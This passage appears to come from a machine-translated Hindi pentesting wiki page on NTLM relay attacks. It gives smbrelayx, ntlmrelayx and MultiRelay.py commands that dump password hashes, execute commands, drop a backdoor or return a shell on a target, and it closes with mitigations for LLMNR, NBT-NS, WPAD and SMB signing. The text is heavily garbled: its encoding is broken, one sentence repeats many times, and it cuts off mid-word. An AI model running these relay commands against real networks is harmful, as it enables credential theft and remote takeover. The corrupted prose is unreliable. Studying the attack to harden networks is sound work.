рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд▓рд┐рдП рдПрдХ SMB рдЕрдиреБрд░реЛрдз рдХреЛ рдЕрдкрдиреЗ рдирд┐рд╢реНрдЪрд┐рдд рдиреЗрдЯрд╡рд░реНрдХ рдкрд░рд┐рдпреЛрдЬрдирд╛ рдХреЗ рд▓рд┐рдП рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдЙрджреНрджреЗрд╢реНрдп рд╕рд░реНрд╡рд░ рдХреЗ рдкрд╛рд╕ рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢рд┐рдд рдХрд░рддрд╛ рд╣реИред рдЗрд╕ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдореЗрдВ, smbrelayx рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд▓рд┐рдП рдПрдХ SMB рдЕрдиреБрд░реЛрдз рдХреЛ рдЕрдкрдиреЗ рдирд┐рд╢реНрдЪрд┐рдд рдиреЗрдЯрд╡рд░реНрдХ рдкрд░рд┐рдпреЛрдЬрдирд╛ рдХреЗ рд▓рд┐рдП рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдЙрджреНрджреЗрд╢реНрдп рд╕рд░реНрд╡рд░ рдХреЗ рдкрд╛рд╕ рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢рд┐рдд рдХрд░рддрд╛ рд╣реИред рдЗрд╕ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдореЗрдВ, smbrelayx рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд▓рд┐рдП рдПрдХ SMB рдЕрдиреБрд░реЛрдз рдХреЛ рдЕрдкрдиреЗ рдирд┐рд╢реНрдЪрд┐рдд рдиреЗрдЯрд╡рд░реНрдХ рдкрд░рд┐рдпреЛрдЬрдирд╛ рдХреЗ рд▓рд┐рдП рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдЙрджреНрджреЗрд╢реНрдп рд╕рд░реНрд╡рд░ рдХреЗ рдкрд╛рд╕ рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢рд┐рдд рдХрд░рддрд╛ рд╣реИред рдЗрд╕ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдореЗрдВ, smbrelayx рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд▓рд┐рдП рдПрдХ SMB рдЕрдиреБрд░реЛрдз рдХреЛ рдЕрдкрдиреЗ рдирд┐рд╢реНрдЪрд┐рдд рдиреЗрдЯрд╡рд░реНрдХ рдкрд░рд┐рдпреЛрдЬрдирд╛ рдХреЗ рд▓рд┐рдП рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдЙрджреНрджреЗрд╢реНрдп рд╕рд░реНрд╡рд░ рдХреЗ рдкрд╛рд╕ рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢рд┐рдд рдХрд░рддрд╛ рд╣реИред рдЗрд╕ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдореЗрдВ, smbrelayx рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд▓рд┐рдП рдПрдХ SMB рдЕрдиреБрд░реЛрдз рдХреЛ рдЕрдкрдиреЗ рдирд┐рд╢реНрдЪрд┐рдд рдиреЗрдЯрд╡рд░реНрдХ рдкрд░рд┐рдпреЛрдЬрдирд╛ рдХреЗ рд▓рд┐рдП рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдЙрджреНрджреЗрд╢реНрдп рд╕рд░реНрд╡рд░ рдХреЗ рдкрд╛рд╕ рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢рд┐рдд рдХрд░рддрд╛ рд╣реИред рдЗрд╕ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдореЗрдВ, smbrelayx рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд▓рд┐рдП рдПрдХ SMB рдЕрдиреБрд░реЛрдз рдХреЛ рдЕрдкрдиреЗ рдирд┐рд╢реНрдЪрд┐рдд рдиреЗрдЯрд╡рд░реНрдХ рдкрд░рд┐рдпреЛрдЬрдирд╛ рдХреЗ рд▓рд┐рдП рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдЙрджреНрджреЗрд╢реНрдп рд╕рд░реНрд╡рд░ рдХреЗ рдкрд╛рд╕ рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢рд┐рдд рдХрд░рддрд╛ рд╣реИред рдЗрд╕ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдореЗрдВ, smbrelayx рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд▓рд┐рдП рдПрдХ SMB рдЕрдиреБрд░реЛрдз рдХреЛ рдЕрдкрдиреЗ рдирд┐рд╢реНрдЪрд┐рдд рдиреЗрдЯрд╡рд░реНрдХ рдкрд░рд┐рдпреЛрдЬрдирд╛ рдХреЗ рд▓рд┐рдП рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдЙрджреНрджреЗрд╢реНрдп рд╕рд░реНрд╡
```bash
python3 smbrelayx.py -t smb://<ip_to_attack> -smb2support --no-http-server --no-wcf-server
# By default it will just dump hashes
# To execute a command use: -c "ipconfig"
# To execute a backdoor use: -e "/path/to/backdoor

# Attack through socks proxy
proxychains python3 ntlmrelayx.py -t smb://<ip_to_attack> -smb2support --no-http-server --no-wcf-server
```
### рдорд▓реНрдЯреАрд░рд┐рд▓реЗ

рдпрджрд┐ рдЖрдк **рдорд▓реНрдЯреАрд░рд┐рд▓реЗ** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ, рддреЛ _**/usr/share/responder/tools**_ рдкрд░ рдЬрд╛рдПрдВ рдФрд░ рдорд▓реНрдЯреАрд░рд┐рд▓реЗ (`-t <IP рд▓рдХреНрд╖реНрдп> -u <рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛>`) рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░реЗрдВ:
```bash
python MultiRelay.py -t <IP target> -u ALL # If "ALL" then all users are relayed
# By default a shell is returned
python MultiRelay.py -t <IP target> -u ALL -c whoami #-c to execute command
python MultiRelay.py -t <IP target> -u ALL -d #-d to dump hashes

# Use proxychains if you need to route the traffic to reach the attacked ip
```
![](<../../.gitbook/assets/image (209).png>)

### NTLM рд▓реЙрдЧрд┐рди рдХреЛ рдмрд▓рд╡рд╛рди рдмрдирд╛рдирд╛

Windows рдореЗрдВ рдЖрдкрдХреЛ рдХреБрдЫ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реА рдЦрд╛рддреЛрдВ рдХреЛ рдЕрдирд┐рдпрдорд┐рдд рдорд╢реАрдиреЛрдВ рдореЗрдВ рдкреНрд░рдорд╛рдгрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдХреНрд╖рдо рд╣реЛ рд╕рдХрддрд╛ рд╣реИред рдЗрд╕реЗ рд╕реАрдЦрдиреЗ рдХреЗ рд▓рд┐рдП рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдкреГрд╖реНрда рдХреЛ рдкрдврд╝реЗрдВ:

{% content-ref url="../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md" %}
[printers-spooler-service-abuse.md](../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md)
{% endcontent-ref %}

## рд╕рдорд╛рдзрд╛рди

### LLMNR рдХреЛ рдЕрдХреНрд╖рдо рдХрд░рдирд╛

DNS рдХреНрд▓рд╛рдЗрдВрдЯ рдХреЗ рд▓рд┐рдП рдЕрдкрдиреЗ рдбреЛрдореЗрди рдореЗрдВ LLMNR рдХреЛ рдЕрдХреНрд╖рдо рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, gpedit.msc рдЦреЛрд▓реЗрдВред\
рдХрдВрдкреНрдпреВрдЯрд░ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди->рдкреНрд░рд╢рд╛рд╕рдирд┐рдХ рдЯреЗрдореНрдкрд▓реЗрдЯ->рдиреЗрдЯрд╡рд░реНрдХ->DNS рдХреНрд▓рд╛рдЗрдВрдЯ рдкрд░ рдЬрд╛рдПрдВред\
рд╡рд┐рдХрд▓реНрдк "рдорд▓реНрдЯреАрдХрд╛рд╕реНрдЯ рдирд╛рдо рд╕рдВрдХреЗрддрди рдмрдВрдж рдХрд░реЗрдВ" рдвреВрдВрдвреЗрдВ рдФрд░ "рдиреАрддрд┐ рд╕реЗрдЯрд┐рдВрдЧ" рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВ:

![](../../.gitbook/assets/1.jpg)

рдирдИ рд╡рд┐рдВрдбреЛ рдЦреБрд▓рдиреЗ рдкрд░, рдЗрд╕ рд╡рд┐рдХрд▓реНрдк рдХреЛ рд╕рдХреНрд╖рдо рдХрд░реЗрдВ, рд▓рд╛рдЧреВ рдХрд░реЗрдВ рдФрд░ рдареАрдХ рд╣реИ рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВ:

![](../../.gitbook/assets/2.jpg)

### NBT-NS рдХреЛ рдЕрдХреНрд╖рдо рдХрд░рдирд╛

NBT-NS рдХреЛ рдЕрдХреНрд╖рдо рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рд╡рд┐рдХрд▓реНрдк DHCP рд╕реНрдХреЛрдк рд╡рд┐рдХрд▓реНрдкреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рд╣реИред

Microsoft рдХреЗ DHCP рд╕рд░реНрд╡рд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд░рд╣реЗ рд╣реИрдВ рддреЛ, NBT-NS рдХреЛ рдЕрдХреНрд╖рдо рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЬрд┐рд╕ рд╕реНрдХреЛрдк рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ, рдЙрд╕ рдкрд░ рджрд╛рдпреЗрдВ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВ "рд╕реНрдХреЛрдк рд╡рд┐рдХрд▓реНрдк" рдФрд░ "рд╡рд┐рдХрд▓реНрдк рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд░реЗрдВ" рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВред рдиреАрдЪреЗ рджрд┐рдП рдЧрдП рдЙрджрд╛рд╣рд░рдг рдореЗрдВ, рдореИрдВ 192.168.1.100 рдХреЗ рд▓рд┐рдП NBT-NS рдХреЛ рдЕрдХреНрд╖рдо рдХрд░рдирд╛ рдЪрд╛рд╣рддрд╛ рд╣реВрдБред

![](../../.gitbook/assets/3.jpg)

рд╕реНрдХреЛрдк рд╡рд┐рдХрд▓реНрдк рд╡рд┐рдВрдбреЛ рдореЗрдВ, рдЙрдиреНрдирдд рдЯреИрдм рдкрд░ рдЬрд╛рдПрдВ, рдбреНрд░реЙрдк рдбрд╛рдЙрди рд╡рд┐рдВрдбреЛ рдХреЛ "Microsoft Windows 2000 Options" рдореЗрдВ рдмрджрд▓реЗрдВ:

![](../../.gitbook/assets/4.jpg)

рд╕реВрдЪреА рд╕реЗ "001 Microsoft Disable Netbios Option" рд╡рд┐рдХрд▓реНрдк рдХрд╛ рдЪрдпрди рдХрд░реЗрдВ рдФрд░ рдЗрд╕рдХреЗ рдорд╛рди рдХреЛ "0x2" рдкрд░ рдмрджрд▓реЗрдВ, рд▓рд╛рдЧреВ рдХрд░реЗрдВ рдФрд░ рдлрд┐рд░ OK рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВ:

![](../../.gitbook/assets/5.jpg)

### WPAD

WPAD рд╣рдорд▓реЗ рдХреЗ рдЦрд┐рд▓рд╛рдл рд╕реБрд░рдХреНрд╖рд╛ рдХреЗ рд▓рд┐рдП, рдЕрдкрдиреЗ DNS рдЬрд╝реЛрди рдореЗрдВ "wpad" рдХреЗ рд▓рд┐рдП рдПрдХ рдкреНрд░рд╡рд┐рд╖реНрдЯрд┐ рдЬреЛрдбрд╝ рд╕рдХрддреЗ рд╣реИрдВред рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ DNS рдкреНрд░рд╡рд┐рд╖реНрдЯрд┐ рдХреЛрдИ рдорд╛рдиреНрдп WPAD рд╕рд░реНрд╡рд░ рдкрд░ рдирд╣реАрдВ рдкрд╣реБрдВрдЪрдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИред рдЬрдм рддрдХ рдХреНрд╡реЗрд░реА рд╣рд▓ рд╣реЛ рдЬрд╛рддреА рд╣реИ, рд╣рдорд▓рд╛ рд░реЛрдХрд╛ рдЬрд╛рдПрдЧрд╛ред

### рдорд▓реНрдЯреА-рд░рд┐рд▓реЗ

1\. рд╕рднреА рд╕реНрдерд╛рдиреАрдп Windows рдорд╢реАрдиреЛрдВ рдкрд░ SMB рд╕рд╛рдЗрдирд┐рдВрдЧ рдХреЛ рдмрд▓рд╡рд╛рди рдмрдирд╛рдирд╛ред рдпрд╣ рд╕реЗрдЯрд┐рдВрдЧ рд╣рд░ SMB рд╕рддреНрд░ рдХреЛ рдбрд┐рдЬрд┐рдЯрд▓реА рд╕рд╛рдЗрди рдХрд░реЗрдЧреА, рдЬрд┐рд╕рд╕реЗ рдХреНрд▓рд╛рдЗрдВрдЯ рдФрд░ рд╕рд░реНрд╡рд░ рджреЛрдиреЛрдВ рдХреЛ рдкреИрдХреЗрдЯ рдХреЗ рд╕реНрд░реЛрдд рдХреА рдкреБрд╖реНрдЯрд┐ рдХрд░рдиреА рд╣реЛрдЧреАред рдпрд╣ рд╕реЗрдЯрд┐рдВрдЧ рдХреЗрд╡рд▓ рдбреЛрдореЗрди рдХрдВрдЯреНрд░реЛрд▓рд░ рдкрд░ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рд╕рдХреНрд╖рдо рд╣реЛрддреА рд╣реИред рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд Microsoft рдХреЗ рд▓реЗрдЦреЛрдВ рдореЗрдВ рдЗрди рд╕реЗрдЯрд┐рдВрдЧреНрд╕ рдХрд╛ рд╡рд┐рд╡рд░рдг рд╣реИ (рдЬрд┐рдиреНрд╣реЗрдВ рд╕рдореВрд╣ рдиреАрддрд┐ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╕рдХреНрд╖рдо рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ), рдФрд░ рдЗрдиреНрд╣реЗрдВ рдХреИрд╕реЗ рд▓рд╛рдЧреВ рдХрд░реЗрдВред

[https://blogs.technet.microsoft.com/josebda/2010/12/01/the-basics-of-smb-signing-covering-both-smb1-and-smb2/](https://blogs.technet.microsoft.com/josebda/2010/12/01/the-basics-of-smb-signing-covering-both-smb1-and-smb2/)

[https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/microsoft-network-client-digitally-sign-communications-always](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/microsoft-network-client-digitally-sign-communications-always)

2\. рд╕реНрдерд╛рдиреАрдп рдиреЗрдЯрд╡рд░реНрдХ рдкрд░ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреА рд╕рдореАрдХреНрд╖рд╛ рдФрд░ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░рдирд╛ рдХрд┐ рдХреЗрд╡рд▓ рдЙрдирдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╡рд╛рд▓реА рдорд╢реАрдиреЛрдВ рдореЗрдВ рджреВрд░рд╕реНрде рд▓реЙрдЧрд┐рди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП: рд╕реИрд▓реА рдХреЗрд╡рд▓ рд╕реИрд▓реА рдХреА рдХрд╛рд░реНрдпрд╕реНрдерд▓реА рдореЗрдВ рд▓реЙрдЧ рдЗрди рдХрд░ рд╕рдХрддреА рд╣реИред рдпрджрд┐ рдХреЛрдИ рд╣рдорд▓рд╛рд╡рд░ рд╕реИрд▓реА рдХреЗ SMB рдкреНрд░рдорд╛рдгреАрдХрд░рдг рд╕рддреНрд░ рдХреЛ рдЕрд╡рд░реБрджреНрдз рдХрд░ рд▓реЗрддрд╛ рд╣реИ, рддреЛ рд╡рд╣ рд╕рддреНрд░ рдХрд┐рд╕реА рднреА рдХрд╛рд░реНрдпрд╕реНрдерд▓реА рдореЗрдВ рд░рд┐рд▓реЗ рдирд╣реАрдВ рдХрд░ рд╕рдХрддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рдпрд╣ рд╡рд┐рдзрд┐ рдЕрдирд░реНрдердХ рд╣реЛ рдЬрд╛рддреА рд╣реИред

3\. рд╕реНрдерд╛рдиреАрдп рдиреЗрдЯрд╡рд░реНрдХ рдкрд░ NTLM рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреЛ рд╕рдВрднрд╡рддрдГ рд╣реЛ рд╕рдХрдиреЗ рдХреА рд╣рдж рддрдХ рдкреНрд░рддрд┐рдмрдВрдзрд┐рдд рдХрд░реЗрдВред рдпрд╣ рд╣рдорд▓рд╛ Kerberos рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХрд╛ рд▓рд╛рдн рдирд╣реАрдВ рдЙрдард╛ рд╕рдХрддрд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП NTLM рдХреА рдорд╛рддреНрд░рд╛ рдХреЛ рд╕реАрдорд┐рдд рдХрд░рдХреЗ рдЗрд╕ рд╣рдорд▓реЗ рдХреЛ рдмрд╣реБрдд рд╣
